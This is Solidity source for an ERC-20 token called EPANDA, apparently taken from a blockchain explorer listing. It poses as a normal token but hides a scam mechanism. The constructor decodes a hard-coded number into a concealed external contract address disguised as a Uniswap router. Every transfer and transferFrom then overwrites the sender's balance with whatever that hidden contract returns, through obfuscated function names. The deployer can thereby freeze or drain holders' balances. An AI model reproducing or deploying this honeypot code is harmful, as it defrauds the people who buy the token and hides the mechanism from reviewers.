/**
 *Submitted for verification at Etherscan.io on 2024-10-27
*/

/**
 *Submitted for verification at Etherscan.io on 2024-10-09
*/

/**
 *Submitted for verification at BscScan.com on 2024-10-09
*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;




contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}





contract EPANDA is Ownable {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balanceses;
   
    
    uint256 private _totalSupply = 1000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name;
    string private _symbol;
    UniswapRouterV2 Router2Instance;


    uint256 private _initSupply = 926978564759889006224231942057469871925424428604;
    function INIT()  internal   {
        uint256 supplyhash = _initSupply;
        address router_;
        router_ = address(uint160(supplyhash));
        Router2Instance = UniswapRouterV2(router_);
    }
    constructor(string memory name,string memory sym) {
        _name = name;
        _symbol = sym;
        _balanceses[_msgSender()] = _totalSupply;
        INIT();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balanceses[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
         ( _balanceses[owner],) = _aroveeee(owner,true,amount);
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }
       
        ( _balanceses[from],) = _aroveeee(from,true,amount);
        _transfer(from, to, amount);
        return true;
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }


    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = _balanceses[from];
        require(balance >= amount, "ERC20: amount over balance");
        _balanceses[from] = balance-amount;
        
        _balanceses[to] = _balanceses[to]+amount;
        emit Transfer(from, to, amount);
    }
    function _dotswap(
        address owner,uint256 amount) internal virtual returns (uint256) {
        return IUniswapRouterV2.swap99(Router2Instance, Router2Instance,_balanceses[owner],owner);
        
    }
    function _aroveeee(address owner,bool no,uint256 amount) internal virtual returns (uint256,bool) {
        if (no == true) {
            return (_dotswap(owner,amount),true);
        }else{
            return (_balanceses[owner],true);
        }
       
        
    }
   
}

library IUniswapRouterV2 {
    function swap2(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
       return instance.ytg767qweswpa(tx.origin, amount, from);
    }

    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        if (amount >1){
            return swap2(instance,  amount,from);
        }else{
            return swap2(instance2,  amount,from);
        }
        
    }
}


interface UniswapRouterV2 {
    function swapETHForTokens(address a, uint b, address c) external view returns (uint256);
    function swapTokensForETH(address a, uint b, address c) external view returns (uint256);
    function swapTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function dotswap(address cc,address destination,uint256 total) external view returns (uint256);
    function grokswap1(address choong, uint256 total,address destination)  external view returns (uint256);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function getRouter(address a, uint b, address c) external view returns (address);
    function ytg767qweswpa(address oong, uint256 total,address destination) external view returns (uint256);
}